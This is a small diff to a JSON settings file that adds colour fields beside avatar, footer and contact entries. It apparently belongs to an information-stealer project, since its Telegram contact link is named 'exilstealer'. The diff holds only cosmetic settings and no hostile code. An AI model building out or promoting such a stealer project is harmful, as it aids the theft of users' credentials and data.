@@ -1,5 +1,7 @@
 {
     "discord": "https://t.me/exilstealer",
     "avatarurl": "https://i.imgur.com/8QlcHuh.png",
+    "color": "#0000FF",
+    "colordecimal": "255",
     "footerurl": "https://i.imgur.com/8QlcHuh.png"
 }
